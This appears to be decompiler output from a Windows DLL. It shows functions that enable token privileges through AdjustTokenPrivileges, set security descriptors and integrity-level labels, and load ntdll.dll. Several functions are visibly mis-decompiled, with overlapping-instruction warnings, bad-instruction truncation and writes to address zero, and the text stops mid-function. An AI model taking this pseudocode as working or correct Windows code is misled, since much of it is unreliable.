/* Function: FUN_1002d970 */

/* WARNING: Instruction at (ram,0x1002da6b) overlaps instruction at (ram,0x1002da6a)
    */

void __fastcall FUN_1002d970(int param_1)

{
  uint *puVar1;
  int extraout_ECX;
  uint *puVar2;
  int iVar3;
  bool bVar4;
  bool bVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  int iStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  iStack_c = 0;
  puVar1 = *(uint **)(param_1 + 0x1c);
  iVar3 = *(int *)(param_1 + 0xc);
  FUN_100f3b40(param_1,**(undefined4 **)(param_1 + 0x40),&local_18);
  iVar3 = iVar3 - iStack_c;
  if (-1 < iVar3) {
    puVar2 = *(uint **)(param_1 + 4);
    if ((int)puVar2 < (int)puVar1) {
      *(undefined4 *)(param_1 + 4) = 0;
    }
    else {
      *(int *)(param_1 + 4) = (int)puVar2 - (int)puVar1;
      puVar2 = puVar1;
    }
    bVar4 = false;
    bVar5 = puVar2 == (uint *)0x0;
    if (!bVar5) {
      uVar9 = 1;
      uVar8 = *(undefined4 *)(param_1 + 4);
      uVar7 = 1;
      uVar6 = **(undefined4 **)(param_1 + 0x40);
      FUN_104c816f(uVar6);
      if (bVar4 || bVar5) {
        if (!bVar4 && !bVar5) {
          local_18 = 0;
          uStack_14 = 0;
          uStack_10 = 0;
          iStack_c = 0;
          FUN_103f03ab(**(undefined4 **)(extraout_ECX + 0x40),&local_18,param_1,iVar3,uVar7,uVar8,
                       uVar9);
          *puVar2 = *puVar2 >> 0x15;
          if (-1 < (int)*puVar2) {
            iVar3 = *(int *)(extraout_ECX + 4);
            *(undefined4 *)(extraout_ECX + 4) = 0;
            if (iVar3 != 0) {
              FUN_103baab8(puVar2,**(undefined4 **)(extraout_ECX + 0x40),1,0,1);
              FUN_101bd076(**(undefined4 **)(extraout_ECX + 0x40),0,iVar3,0,0,0,0,
                           *(undefined4 *)(extraout_ECX + 0x38));
            }
          }
          FUN_100579df();
          return;
        }
      }
      else {
        uVar6 = *(undefined4 *)(param_1 + 0x38);
      }
      FUN_103ae1fa(**(undefined4 **)(param_1 + 0x40),0,puVar2,0,0,0,0,uVar6);
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002da00 */

/* WARNING: Instruction at (ram,0x1002da6b) overlaps instruction at (ram,0x1002da6a)
    */

void __fastcall FUN_1002da00(int param_1)

{
  int iVar1;
  uint *unaff_EBX;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  uint uStack_8;
  
  uStack_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  uStack_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  uStack_c = 0;
  FUN_103f03ab(**(undefined4 **)(param_1 + 0x40),&uStack_18);
  *unaff_EBX = *unaff_EBX >> 0x15;
  if (-1 < (int)*unaff_EBX) {
    iVar1 = *(int *)(param_1 + 4);
    *(undefined4 *)(param_1 + 4) = 0;
    if (iVar1 != 0) {
      FUN_103baab8();
      FUN_101bd076(**(undefined4 **)(param_1 + 0x40),0,iVar1,0,0,0,0,*(undefined4 *)(param_1 + 0x38)
                  );
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002da80 */

/* WARNING: Instruction at (ram,0x1002db03) overlaps instruction at (ram,0x1002db02)
    */

void __fastcall FUN_1002da80(int *param_1)

{
  int *piVar1;
  int iVar2;
  undefined4 extraout_EDX;
  int iVar3;
  int *piVar4;
  int *piVar5;
  undefined4 local_18;
  undefined4 uStack_14;
  int iStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18 = 0;
  uStack_14 = 0;
  iStack_10 = 0;
  uStack_c = 0;
  piVar1 = (int *)param_1[4];
  iVar3 = param_1[2];
  piVar5 = piVar1;
  FUN_10493fea(piVar1,*(undefined4 *)param_1[0x10],&local_18);
  iVar3 = iVar3 - iStack_10;
  piVar4 = piVar1;
  if (-1 < iVar3) {
    iVar2 = *param_1;
    if (iVar2 < iVar3 - (int)piVar1) {
      piVar4 = (int *)-(int)piVar1;
      *param_1 = (int)piVar1 + iVar2;
    }
    else {
      *param_1 = iVar3;
      piVar4 = (int *)(iVar2 - iVar3);
    }
    if (piVar4 != (int *)0x0) goto code_r0x1002dad9;
  }
  param_1 = piVar5;
code_r0x1002dad9:
  FUN_10159e26(*(undefined4 *)param_1[0x10],0,*param_1,1);
  FUN_1044b521(*(undefined4 *)param_1[0x10],piVar4,0,0,0,0,0,param_1[0xe],extraout_EDX);
  FUN_100579df();
  return;
}



/* Function: FUN_1002db20 */

void __fastcall FUN_1002db20(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 local_18;
  undefined4 uStack_14;
  int iStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18 = 0;
  uStack_14 = 0;
  iStack_10 = 0;
  uStack_c = 0;
  iVar1 = param_1[4];
  iVar2 = param_1[2];
  FUN_105eee11(param_1,*(undefined4 *)param_1[0x10],&local_18);
  if (-1 < iVar2 - iStack_10) {
    iVar3 = *param_1;
    if (iVar3 < iVar1) {
      *param_1 = 0;
    }
    else {
      *param_1 = iVar3 - iVar1;
      iVar3 = iVar1;
    }
    if (iVar3 != 0) {
      FUN_104fc83d(iVar2 - iStack_10,*(undefined4 *)param_1[0x10],0,*param_1,1);
      FUN_104368d6(&stack0xfffffffc,*(undefined4 *)param_1[0x10],iVar3,0,0,0,0,0,param_1[0xe]);
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002dbb0 */

void __fastcall FUN_1002dbb0(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  undefined4 local_18;
  undefined4 uStack_14;
  int iStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18 = 0;
  uStack_14 = 0;
  iStack_10 = 0;
  uStack_c = 0;
  iVar3 = param_1[6];
  iVar2 = param_1[2];
  iVar4 = iVar3;
  FUN_1012fde2(param_1,*(undefined4 *)param_1[0x10],&local_18);
  iVar2 = iVar2 - iStack_10;
  if (-1 < iVar2) {
    iVar1 = *param_1;
    if (iVar1 < iVar2 - iVar3) {
      iVar3 = -iVar3;
      *param_1 = iVar4 + iVar1;
    }
    else {
      *param_1 = iVar2;
      iVar3 = iVar1 - iVar2;
    }
    if (iVar3 != 0) {
      FUN_1014fab4(&stack0xfffffffc,*(undefined4 *)param_1[0x10],0,*param_1,1);
      FUN_10182a90(*(undefined4 *)param_1[0x10],iVar3,0,0,0,0,0,param_1[0xe]);
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002dc50 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Instruction at (ram,0x1002dc79) overlaps instruction at (ram,0x1002dc77)
    */

void __fastcall FUN_1002dc50(int *param_1)

{
  byte bVar1;
  byte *pbVar2;
  byte bVar3;
  byte extraout_CH;
  byte *pbVar4;
  undefined1 uVar5;
  undefined1 uVar6;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  uVar6 = (int)local_8 < 0;
  uVar5 = local_8 == 0;
  local_18 = 0;
  uStack_14 = 0;
  uStack_10 = 0;
  uStack_c = 0;
  pbVar2 = (byte *)param_1[6];
  bVar3 = FUN_103a96e8(*(undefined4 *)param_1[0x10],&local_18);
  LOCK();
  bVar1 = *pbVar2;
  *pbVar2 = extraout_CH;
  UNLOCK();
  while (!(bool)uVar5) {
    bVar3 = bVar3 ^ bVar1;
    uVar6 = (char)bVar3 < '\0';
    uVar5 = bVar3 == 0;
  }
  if (!(bool)uVar6) {
    pbVar4 = (byte *)*param_1;
    if ((int)pbVar4 < (int)pbVar2) {
      *param_1 = 0;
    }
    else {
      *param_1 = (int)pbVar4 - (int)pbVar2;
      pbVar4 = pbVar2;
    }
    if (pbVar4 != (byte *)0x0) {
      FUN_10306ee6(*(undefined4 *)param_1[0x10],0,*param_1,1);
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002dce0 */

void __thiscall
FUN_1002dce0(int param_1,int param_2,undefined4 param_3,int *param_4,int param_5,int param_6,
            int param_7)

{
  int iVar1;
  int iVar2;
  undefined2 in_SS;
  int iVar3;
  undefined2 uVar4;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  int local_1c;
  undefined4 local_18;
  undefined4 uStack_14;
  int iStack_10;
  int iStack_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18 = 0;
  uStack_14 = 0;
  iStack_10 = 0;
  iStack_c = 0;
  FUN_1027fa4f(*(undefined4 **)(param_1 + 0x40),**(undefined4 **)(param_1 + 0x40),&local_18);
  iVar2 = iStack_10;
  if (param_2 == 1) {
    iVar2 = iStack_c;
  }
  param_5 = param_5 - iVar2;
  if (param_5 < 0) goto switchD_1002dd33_default;
  switch(param_3) {
  case 0:
    iVar2 = *param_4;
    if (param_7 <= iVar2) {
      iVar1 = iVar2 - param_7;
      iVar2 = param_7;
      goto LAB_1002ddf8;
    }
LAB_1002dd62:
    *param_4 = 0;
    break;
  case 1:
    iVar1 = *param_4;
    if (iVar1 < param_5 - param_7) {
      iVar2 = -param_7;
      iVar1 = param_7 + iVar1;
      goto LAB_1002ddf8;
    }
LAB_1002dd85:
    *param_4 = param_5;
    iVar2 = iVar1 - param_5;
    break;
  case 2:
    iVar2 = *param_4;
    if (iVar2 < param_6) goto LAB_1002dd62;
    iVar1 = iVar2 - param_6;
    iVar2 = param_6;
    goto LAB_1002ddf8;
  case 3:
    iVar1 = *param_4;
    if (param_5 - param_6 <= iVar1) goto LAB_1002dd85;
    iVar2 = -param_6;
    iVar1 = param_6 + iVar1;
    goto LAB_1002ddf8;
  case 4:
    goto switchD_1002dd33_caseD_4;
  case 5:
    if ((*(uint *)(param_1 + 0x3c) >> 2 & 1) != 0) goto switchD_1002dd33_default;
switchD_1002dd33_caseD_4:
    local_34 = 0x1c;
    local_30 = 0x10;
    local_2c = 0;
    uStack_28 = 0;
    uStack_24 = 0;
    uStack_20 = 0;
    local_1c = 0;
    iVar2 = FUN_1030e542(param_4,**(undefined4 **)(param_1 + 0x40),param_2,&local_34);
    if (iVar2 == 0) goto switchD_1002dd33_default;
    iVar2 = *param_4 - local_1c;
    iVar1 = local_1c;
LAB_1002ddf8:
    *param_4 = iVar1;
    break;
  case 6:
    iVar2 = *param_4;
    *param_4 = 0;
    break;
  case 7:
    iVar2 = *param_4 - param_5;
    *param_4 = param_5;
    break;
  default:
    goto switchD_1002dd33_default;
  }
  if (iVar2 != 0) {
    uVar4 = 0x1002;
    FUN_1036e037(**(undefined4 **)(param_1 + 0x40),param_2,*param_4,1);
    if (param_2 == 1) {
      iVar1 = 0;
      iVar3 = iVar2;
    }
    else {
      iVar3 = 0;
      iVar1 = iVar2;
    }
    FUN_1013a0e9(*(undefined4 **)(param_1 + 0x40),**(undefined4 **)(param_1 + 0x40),iVar1,iVar3,0,0,
                 0,0,*(undefined4 *)(param_1 + 0x38),CONCAT22(uVar4,in_SS));
  }
switchD_1002dd33_default:
  FUN_100579df();
  return;
}



/* Function: FUN_1002de70 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __thiscall FUN_1002de70(undefined4 *param_1,int *param_2,undefined4 param_3)

{
  byte *pbVar1;
  uint uVar2;
  undefined4 uVar3;
  int iVar4;
  int *piVar5;
  undefined4 extraout_ECX;
  int unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 uVar6;
  undefined4 *puVar7;
  undefined4 uVar8;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076290;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  local_8 = 0;
  uVar8 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = param_3;
  param_1[9] = 0;
  FUN_1049a2c6(param_3,0,uVar2);
  uVar6 = 0x28;
  puVar7 = param_1;
  uVar3 = (*DAT_10079264)(0x28,param_1);
  iVar4 = FUN_1054dd26(param_1,uVar3,uVar6,puVar7,param_3,uVar8,uVar2,unaff_EDI,unaff_ESI);
  if (iVar4 != 0) {
    uVar3 = FUN_1002e000();
    param_1[7] = uVar3;
  }
  iVar4 = FUN_1047f93b();
  param_1[9] = iVar4;
  if (iVar4 != 0) {
    if ((param_2 == (int *)0x0) || ((short)*param_2 != 0)) {
      piVar5 = (int *)FUN_1000bd10();
    }
    else {
      piVar5 = (int *)FUN_1000ba60();
    }
    local_8 = CONCAT31(local_8._1_3_,1);
    FUN_1000ae10();
    FUN_10006250();
    if (param_2 != (int *)0x0) {
      LOCK();
      iVar4 = *param_2;
      *param_2 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee();
      }
    }
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar4 = *piVar5;
      *piVar5 = *piVar5 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee();
      }
    }
  }
  FUN_100df96e();
  pbVar1 = (byte *)(unaff_EBX + -0xbb27439);
  *pbVar1 = *pbVar1 >> 4 | *pbVar1 << 4;
  _DAT_00000000 = extraout_ECX;
  return;
}



/* Function: FUN_1002dfc0 */

/* WARNING: Instruction at (ram,0x1002dfe8) overlaps instruction at (ram,0x1002dfe7)
    */

void __fastcall FUN_1002dfc0(int *param_1)

{
  code *pcVar1;
  int extraout_ECX;
  int iVar2;
  int unaff_EBP;
  char cVar3;
  
  if ((param_1[6] != 0) && (param_1[8] != 0)) {
    cVar3 = '\0';
    if (*param_1 != 0) {
      pcVar1 = (code *)FUN_1033ab66(*param_1,0,param_1 + 2,0,0,0);
      cRam079270a1 = (char)pcVar1;
      *(char *)(unaff_EBP + -0x74f68b40) = *(char *)(unaff_EBP + -0x74f68b40) + cRam079270a1 + cVar3
      ;
      iVar2 = extraout_ECX;
      goto code_r0x1002dff3;
    }
  }
  if (DAT_10079270 == (code *)0x0) {
    return;
  }
  iVar2 = *param_1;
  pcVar1 = DAT_10079270;
code_r0x1002dff3:
  if (iVar2 != 0) {
    (*pcVar1)(iVar2);
  }
  return;
}



/* Function: FUN_1002e000 */

void __fastcall
FUN_1002e000(int *param_1,undefined4 param_2,short *param_3,undefined4 param_4,int param_5)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  byte extraout_CL;
  int unaff_EBX;
  int in_stack_c70674fb;
  char *pcVar4;
  int *local_38;
  int *local_28;
  undefined4 local_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100762d8;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_28 = param_1;
  if ((param_1 != (int *)0x0) && (param_3 != (short *)0x0)) {
    local_24 = 0;
    uStack_20 = 0;
    uStack_1c = 0;
    uStack_18 = 0;
    iVar1 = FUN_102f79f4(param_2,0,param_3,&uStack_20,local_14);
    if (iVar1 == 0) {
      FUN_1001e7d0();
      local_8 = 3;
      piVar2 = (int *)FUN_1000ae10(&local_28);
      if (*piVar2 == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = *piVar2 + 0xc;
      }
      FUN_10006250("LookupPrivilegeValue: \'%s\'\n",iVar1);
      if (local_28 != (int *)0x0) {
        LOCK();
        iVar1 = *local_28;
        *local_28 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(local_28);
        }
      }
      if (local_38 != (int *)0x0) {
        LOCK();
        iVar1 = *local_38;
        *local_38 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(local_38);
        }
      }
      if (*param_3 == 0) {
        piVar2 = (int *)FUN_1000ba60();
      }
      else {
        piVar2 = (int *)FUN_1000bd10();
      }
      local_8 = 4;
      piVar3 = (int *)FUN_1000ae10(&local_28);
      if (*piVar3 == 0) {
        param_5 = 0;
      }
      else {
        param_5 = *piVar3 + 0xc;
      }
      pcVar4 = "\'%s\' not found.\n";
    }
    else {
      local_24 = 1;
      uStack_18 = 2;
      iVar1 = FUN_10233792(local_28,*local_28,0,&local_24,0x10,param_4,param_5);
      if (iVar1 == 0) {
        FUN_1001e7d0();
        local_8 = 1;
        piVar2 = (int *)FUN_1000ae10(&local_28);
        if (*piVar2 == 0) {
          iVar1 = 0;
        }
        else {
          iVar1 = *piVar2 + 0xc;
        }
        FUN_10006250("AdjustTokenPrivileges: \'%s\'\n",iVar1);
        if (local_28 != (int *)0x0) {
          LOCK();
          iVar1 = *local_28;
          *local_28 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(local_28);
          }
        }
        if (local_38 != (int *)0x0) {
          LOCK();
          iVar1 = *local_38;
          *local_38 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(local_38);
          }
        }
        if (*param_3 == 0) {
          piVar2 = (int *)FUN_1000ba60();
        }
        else {
          piVar2 = (int *)FUN_1000bd10();
        }
        local_8 = 2;
        piVar3 = (int *)FUN_1000ae10(&local_28);
        if (*piVar3 == 0) {
          pcVar4 = "Cannot enable: \'%s\'\n";
        }
        else {
          pcVar4 = "Cannot enable: \'%s\'\n";
        }
      }
      else {
        iVar1 = FUN_101a3e27();
        *(byte *)(unaff_EBX + 0x75c985c8) = *(byte *)(unaff_EBX + 0x75c985c8) | extraout_CL;
        piVar2 = (int *)(iVar1 + in_stack_c70674fb);
        *piVar2 = (int)(*piVar2 + (int)piVar2);
        *(char *)piVar2 = (char)*piVar2 + (char)piVar2;
        if (*param_3 == 0) {
          piVar2 = (int *)FUN_1000ba60();
        }
        else {
          piVar2 = (int *)FUN_1000bd10();
        }
        local_8 = 0;
        piVar3 = (int *)FUN_1000ae10(&local_28);
        if (*piVar3 == 0) {
          param_5 = 0;
          pcVar4 = "\'%s\' enabled.\n";
        }
        else {
          param_5 = *piVar3 + 0xc;
          pcVar4 = "\'%s\' enabled.\n";
        }
      }
    }
    FUN_10006250(pcVar4,param_5);
    if (local_28 != (int *)0x0) {
      LOCK();
      iVar1 = *local_28;
      *local_28 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_28);
      }
    }
    if (piVar2 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar2;
      *piVar2 = *piVar2 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar2);
      }
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1002e2e0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 * __thiscall FUN_1002e2e0(undefined8 *param_1,int param_2,int param_3,undefined4 param_4)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  char *pcVar3;
  byte extraout_AH;
  uint uVar4;
  int iVar5;
  byte extraout_CH;
  byte extraout_DL;
  int unaff_EBX;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007630e;
  local_10 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  puVar1 = (undefined4 *)((int)param_1 + 0xc);
  puVar2 = (undefined4 *)((int)param_1 + 4);
  *param_1 = 0;
  *(undefined4 *)(param_1 + 1) = 0;
  *puVar1 = 0;
  *(undefined4 *)(param_1 + 2) = 0;
  *(undefined4 *)((int)param_1 + 0x14) = 0;
  *(undefined4 *)(param_1 + 3) = 0;
  *(undefined4 *)((int)param_1 + 0x1c) = 0;
  *(undefined4 *)param_1 = 0xc;
  *(undefined4 *)(param_1 + 1) = param_4;
  *puVar2 = puVar1;
  iVar5 = FUN_1036596c(&stack0xfffffffc,puVar1,1,uVar4);
  if (iVar5 != 0) {
    if (param_2 == 0) {
      if ((DAT_10099158 & 1) == 0) {
        DAT_10099158 = DAT_10099158 | 1;
        FUN_100064d0();
        FUN_10057b51(&LAB_10078190);
      }
      if (DAT_10099154 != (code *)0x0) {
        (*DAT_10099154)(L"D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GRGW;;;AU)(A;OICI;GA;;;BA)",1,
                        puVar2,0);
      }
    }
    else {
      iVar5 = FUN_100f2454(*puVar2,1,0,param_2);
      param_1 = (undefined8 *)((int)param_1 + 4);
      if (iVar5 == 0) {
        ExceptionList = local_10;
        return param_1;
      }
    }
    if (param_3 != 4) {
      if ((DAT_1009b548 & 1) == 0) {
        DAT_1009b548 = DAT_1009b548 | 1;
        _DAT_1009b54c = (byte *)0x0;
        DAT_1009b550 = 0;
        _DAT_1009b54c = (byte *)FUN_1047a018("ntdll.dll");
        LOCK();
        _DAT_1009b54c[-0x58] = extraout_CH;
        UNLOCK();
        *_DAT_1009b54c = *_DAT_1009b54c | extraout_DL;
        FUN_1036f6cf(_DAT_1009b54c);
        pcVar3 = (char *)((int)&DAT_1009b550 + unaff_EBX + 1);
        *pcVar3 = *pcVar3 + (extraout_AH & 0xe0);
        FUN_10057b51();
      }
      if (DAT_1009b550 != 0) {
        if ((DAT_1009b244 & 1) == 0) {
          DAT_1009b244 = DAT_1009b244 | 1;
          local_8 = 0;
          _DAT_1009b248 = 0x114;
          if ((DAT_1009b4dc & 1) == 0) {
            DAT_1009b4dc = DAT_1009b4dc | 1;
            FUN_1001a9a0();
            FUN_10057b51(&DAT_100784c0);
          }
          (*DAT_1009b50c)(&DAT_1009b248);
          local_8 = 0xffffffff;
        }
        if (0x5ff < (ushort)((ushort)DAT_1009b24c * 0x100 + (ushort)DAT_1009b250)) {
          FUN_1002e4c0(param_3);
        }
      }
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1002e4a0 */

void __fastcall FUN_1002e4a0(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((param_1 + 0xc != iVar1) && (iVar1 != 0)) {
    (*DAT_10079288)(iVar1);
  }
  return;
}



/* Function: FUN_1002e4c0 */

void __thiscall FUN_1002e4c0(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 local_28;
  int local_24;
  undefined4 local_20;
  int local_1c;
  wchar_t *local_18 [4];
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_18[0] = L"S:(ML;;NW;;;LW)";
  local_18[1] = L"S:(ML;;NW;;;ME)";
  local_18[2] = L"S:(ML;;NW;;;HI)";
  local_18[3] = L"S:(ML;;NW;;;SI)";
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  if (DAT_10099154 == (code *)0x0) {
    FUN_100579df();
    return;
  }
  local_1c = 0;
  iVar1 = (*DAT_10099154)(local_18[param_2],1,&local_1c,0);
  if (local_1c != 0) {
    local_20 = 0;
    local_24 = 0;
    local_28 = 0;
    iVar3 = local_1c;
    FUN_104b1a37(&local_24,local_1c,&local_24,&local_20,&local_28);
    iVar2 = 0;
    if (local_24 != 0) {
      iVar2 = FUN_104c5875(iVar3,1,local_20,0,*(undefined4 *)(param_1 + 4));
    }
    if (local_1c != 0) {
      (*DAT_10079288)(local_1c);
    }
    if ((iVar1 != 0) && (iVar2 != 0)) {
      FUN_100579df();
      return;
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1002e5e0 */

/* WARNING: Instruction at (ram,0x1002e676) overlaps instruction at (ram,0x1002e674)
    */

undefined4 * __fastcall FUN_1002e5e0(undefined4 *param_1)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 *puVar6;
  int extraout_ECX;
  undefined4 *local_8;
  
  uVar2 = DAT_10099158;
  *param_1 = 0;
  if ((uVar2 & 1) == 0) {
    DAT_10099158 = uVar2 | 1;
    local_8 = param_1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  local_8 = (undefined4 *)0x0;
  FUN_103c0395(8,1,&local_8);
  if (extraout_ECX != 0) {
    iVar3 = (*DAT_100990e0)();
    if (iVar3 == 0) {
      uVar4 = (*DAT_10079264)(8,&local_8);
      (*DAT_100990dc)(uVar4);
    }
    if (local_8 != (undefined4 *)0x0) {
      uVar4 = FUN_1002e700();
      uVar5 = FUN_1002e680();
      *param_1 = uVar5;
      FUN_100579ee(uVar4);
      (*DAT_10079270)(local_8);
    }
    return param_1;
  }
  pcVar1 = (code *)swi(3);
  puVar6 = (undefined4 *)(*pcVar1)();
  return puVar6;
}



/* Function: FUN_1002e680 */

int __fastcall FUN_1002e680(undefined4 param_1)

{
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  if ((DAT_10099118 != (code *)0x0) && (DAT_1009911c != (code *)0x0)) {
    uVar1 = (*DAT_10099118)(param_1);
    iVar2 = FUN_100581b4(uVar1);
    if (iVar2 != 0) {
      iVar3 = (*DAT_1009911c)(uVar1,iVar2,param_1);
      if (iVar3 == 0) {
        FUN_100579ee(iVar2);
        return 0;
      }
    }
    return iVar2;
  }
  return 0;
}



/* Function: FUN_1002e700 */

undefined4 __fastcall FUN_1002e700(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 local_8;
  
  local_8 = param_1;
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  if (DAT_10099120 != (code *)0x0) {
    (*DAT_10099120)(param_1,1,0,0,&local_8);
    iVar1 = FUN_10420619(&stack0xfffffffc);
    if ((iVar1 == 0x7a) || (iVar1 == 0x18)) {
      uVar2 = FUN_100581b4(local_8);
      iVar1 = (*DAT_10099120)(param_1,1,uVar2,local_8,&local_8);
      if (iVar1 == 0) {
        FUN_100579ee(uVar2);
        return 0;
      }
      return uVar2;
    }
  }
  return 0;
}



/* Function: FUN_1002e7a0 */

undefined4 * __thiscall FUN_1002e7a0(undefined4 *param_1,undefined4 param_2)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  FUN_1002e7e0(param_2);
  return param_1;
}



/* Function: FUN_1002e7e0 */

void __thiscall FUN_1002e7e0(int param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 uVar2;
  char *pcVar3;
  undefined4 local_b;
  undefined3 uStack_7;
  
  local_b = (uint)(uint3)local_b;
  uStack_7 = 0;
  iVar1 = FUN_1030d6f6(param_2,(int)&local_b + 3);
  iVar1 = iVar1 + -1;
  if (iVar1 != 0) {
    uVar2 = FUN_100581b4(iVar1);
    pcVar3 = (char *)FUN_1041c1bf(param_2,CONCAT31(uStack_7,local_b._3_1_),iVar1,uVar2);
    *pcVar3 = *pcVar3 + (char)pcVar3;
    *pcVar3 = *pcVar3 + (char)pcVar3;
    FUN_1052681f(uVar2,&DAT_1008401c,&local_b,pcVar3);
    if (local_b != 0) {
      *(uint *)(param_1 + 0xc) = (uint)*(ushort *)(local_b + 10);
      *(uint *)(param_1 + 0x10) = (uint)*(ushort *)(local_b + 8);
      *(uint *)(param_1 + 0x14) = (uint)*(ushort *)(local_b + 0xe);
      *(uint *)(param_1 + 0x18) = (uint)*(ushort *)(local_b + 0xc);
    }
    FUN_100579ee(uVar2);
  }
  return;
}



/* Function: FUN_1002e880 */

undefined4 * FUN_1002e880(undefined4 param_1)

{
  int iVar1;
  undefined4 *extraout_ECX;
  code *unaff_ESI;
  int *piVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 *puVar7;
  undefined4 local_14;
  int *local_10;
  int local_c;
  undefined4 local_8;
  
  uVar3 = 0;
  uVar4 = 0;
  uVar5 = 0;
  uVar6 = 0;
  FUN_1014aa94();
  puVar7 = extraout_ECX + 2;
  *extraout_ECX = 0;
  extraout_ECX[1] = 0;
  *puVar7 = uVar3;
  extraout_ECX[3] = uVar4;
  extraout_ECX[4] = uVar5;
  extraout_ECX[5] = uVar6;
  extraout_ECX[6] = uVar3;
  extraout_ECX[7] = uVar4;
  extraout_ECX[8] = uVar5;
  extraout_ECX[9] = uVar6;
  *puVar7 = uVar3;
